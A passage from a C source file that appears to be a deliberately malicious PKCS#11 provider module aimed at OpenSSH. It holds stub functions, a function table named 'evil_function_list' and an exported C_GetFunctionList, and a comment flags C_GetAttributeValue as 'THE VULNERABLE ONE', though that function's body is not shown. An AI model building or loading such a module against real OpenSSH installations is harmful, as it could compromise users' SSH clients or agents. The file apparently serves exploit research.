    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SignEncryptUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pPart, CK_ULONG ulPartLen,
    unsigned char *pEncryptedPart, CK_ULONG *pulEncryptedPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DecryptVerifyUpdate(CK_SESSION_HANDLE hSession,
    unsigned char *pEncryptedPart, CK_ULONG ulEncryptedPartLen,
    unsigned char *pPart, CK_ULONG *pulPartLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_GenerateKey(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, struct ck_attribute *pTemplate,
    CK_ULONG ulCount, CK_OBJECT_HANDLE *phKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_GenerateKeyPair(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism,
    struct ck_attribute *pPublicKeyTemplate,
    CK_ULONG ulPublicKeyAttributeCount,
    struct ck_attribute *pPrivateKeyTemplate,
    CK_ULONG ulPrivateKeyAttributeCount,
    CK_OBJECT_HANDLE *phPublicKey, CK_OBJECT_HANDLE *phPrivateKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_WrapKey(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hWrappingKey,
    CK_OBJECT_HANDLE hKey, unsigned char *pWrappedKey,
    CK_ULONG *pulWrappedKeyLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_UnwrapKey(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hUnwrappingKey,
    unsigned char *pWrappedKey, CK_ULONG ulWrappedKeyLen,
    struct ck_attribute *pTemplate, CK_ULONG ulAttributeCount,
    CK_OBJECT_HANDLE *phKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_DeriveKey(CK_SESSION_HANDLE hSession,
    struct ck_mechanism *pMechanism, CK_OBJECT_HANDLE hBaseKey,
    struct ck_attribute *pTemplate, CK_ULONG ulAttributeCount,
    CK_OBJECT_HANDLE *phKey)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_SeedRandom(CK_SESSION_HANDLE hSession,
    unsigned char *pSeed, CK_ULONG ulSeedLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_GenerateRandom(CK_SESSION_HANDLE hSession,
    unsigned char *pRandomData, CK_ULONG ulRandomLen)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_GetFunctionStatus(CK_SESSION_HANDLE hSession)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_CancelFunction(CK_SESSION_HANDLE hSession)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

static CK_RV impl_C_WaitForSlotEvent(CK_FLAGS flags,
    CK_SLOT_ID *pSlot, CK_VOID_PTR pReserved)
{
    return CKR_FUNCTION_NOT_SUPPORTED;
}

/* ===== Function list table ===== */
struct ck_function_list evil_function_list = {
    /* version */
    {2, 40},

    /* C_Initialize through C_Finalize */
    impl_C_Initialize,
    impl_C_Finalize,

    /* C_GetInfo through C_GetFunctionList */
    impl_C_GetInfo,
    impl_C_GetFunctionList,

    /* C_GetSlotList through C_GetMechanismInfo */
    impl_C_GetSlotList,
    impl_C_GetSlotInfo,
    impl_C_GetTokenInfo,
    impl_C_GetMechanismList,
    impl_C_GetMechanismInfo,

    /* C_InitToken through C_SetPIN */
    impl_C_InitToken,
    impl_C_InitPIN,
    impl_C_SetPIN,

    /* C_OpenSession through C_Logout */
    impl_C_OpenSession,
    impl_C_CloseSession,
    impl_C_CloseAllSessions,
    impl_C_GetSessionInfo,
    impl_C_GetOperationState,
    impl_C_SetOperationState,
    impl_C_Login,
    impl_C_Logout,

    /* C_CreateObject through C_GetObjectSize */
    impl_C_CreateObject,
    impl_C_CopyObject,
    impl_C_DestroyObject,
    impl_C_GetObjectSize,

    /* C_GetAttributeValue (THE VULNERABLE ONE) */
    impl_C_GetAttributeValue,
    impl_C_SetAttributeValue,

    /* C_FindObjects* */
    impl_C_FindObjectsInit,
    impl_C_FindObjects,
    impl_C_FindObjectsFinal,

    /* C_EncryptInit through C_EncryptFinal */
    impl_C_EncryptInit,
    impl_C_Encrypt,
    impl_C_EncryptUpdate,
    impl_C_EncryptFinal,

    /* C_DecryptInit through C_DecryptFinal */
    impl_C_DecryptInit,
    impl_C_Decrypt,
    impl_C_DecryptUpdate,
    impl_C_DecryptFinal,

    /* C_DigestInit through C_DigestFinal */
    impl_C_DigestInit,
    impl_C_Digest,
    impl_C_DigestUpdate,
    impl_C_DigestKey,
    impl_C_DigestFinal,

    /* C_SignInit through C_SignRecover */
    impl_C_SignInit,
    impl_C_Sign,
    impl_C_SignUpdate,
    impl_C_SignFinal,
    impl_C_SignRecoverInit,
    impl_C_SignRecover,

    /* C_VerifyInit through C_VerifyRecover */
    impl_C_VerifyInit,
    impl_C_Verify,
    impl_C_VerifyUpdate,
    impl_C_VerifyFinal,
    impl_C_VerifyRecoverInit,
    impl_C_VerifyRecover,

    /* C_DigestEncryptUpdate through C_DecryptVerifyUpdate */
    impl_C_DigestEncryptUpdate,
    impl_C_DecryptDigestUpdate,
    impl_C_SignEncryptUpdate,
    impl_C_DecryptVerifyUpdate,

    /* C_GenerateKey through C_DeriveKey */
    impl_C_GenerateKey,
    impl_C_GenerateKeyPair,
    impl_C_WrapKey,
    impl_C_UnwrapKey,
    impl_C_DeriveKey,

    /* C_SeedRandom through C_GenerateRandom */
    impl_C_SeedRandom,
    impl_C_GenerateRandom,

    /* C_GetFunctionStatus through C_CancelFunction */
    impl_C_GetFunctionStatus,
    impl_C_CancelFunction,

    /* C_WaitForSlotEvent */
    impl_C_WaitForSlotEvent
};

/*
 * This is the only symbol OpenSSH looks up directly.
 * It returns a pointer to the function list above.
 * All other functions are called through the function list.
 */
EXPORT CK_RV C_GetFunctionList(struct ck_function_list **ppFunctionList)
{
    if (ppFunctionList == NULL)
        return CKR_GENERAL_ERROR;
    *ppFunctionList = &evil_function_list;
    return CKR_OK;
}


